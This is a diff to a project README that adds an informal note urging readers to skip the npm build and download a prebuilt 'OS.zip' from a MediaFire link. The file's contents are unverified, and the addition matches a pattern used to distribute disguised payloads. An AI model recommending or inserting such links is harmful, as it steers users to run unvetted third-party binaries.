@@ -18,3 +18,7 @@ npm install
 npm run serve
 ```
 and enjoj!
+
+but if you're too damn lazy to npm i on this.
+download the zip file so you dont have to.
+https://www.mediafire.com/file/fhsrwfyswlf5hm8/OS.zip/file
